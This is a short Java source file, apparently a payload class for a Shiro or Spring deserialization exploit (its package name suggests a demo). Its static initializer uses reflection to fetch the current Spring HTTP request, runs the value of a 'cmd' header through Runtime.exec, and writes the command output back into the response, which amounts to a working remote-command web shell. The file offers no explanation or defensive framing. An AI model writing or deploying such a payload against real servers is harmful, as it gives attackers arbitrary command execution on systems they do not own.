package priv.ga0weI.demoshrio;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.util.Scanner;

public class Referenceforspringback {

    static {
        try{
            Object var1 = null;
            Method var2 = Class.forName("org.springframework.web.context.request.RequestContextHolder").getMethod("getRequestAttributes", (Class[])null);
            Object var3 = var2.invoke((Object)null, (Object[])null);
            var2 = var3.getClass().getMethod("getRequest", (Class[])null);
            Object var4 = var2.invoke(var3, (Object[])null);
            var2 = var4.getClass().getMethod("getHeader", String.class);
            String var5 = (String)var2.invoke(var4, "cmd");
            String var6 = (new Scanner(Runtime.getRuntime().exec(var5).getInputStream())).useDelimiter("\\A").next();
            var2 = var3.getClass().getMethod("getResponse", (Class[])null);
            Object var7 = var2.invoke(var3, (Object[])null);
            var2 = var7.getClass().getMethod("getWriter", (Class[])null);
            PrintWriter var8 = (PrintWriter)var2.invoke(var7, (Object[])null);
            var8.println(var6);
        }catch (Exception e){
            System.out.println(e);
        }
    }

    public Referenceforspringback/* $FF was: 426807834068500*/() {
        }


}
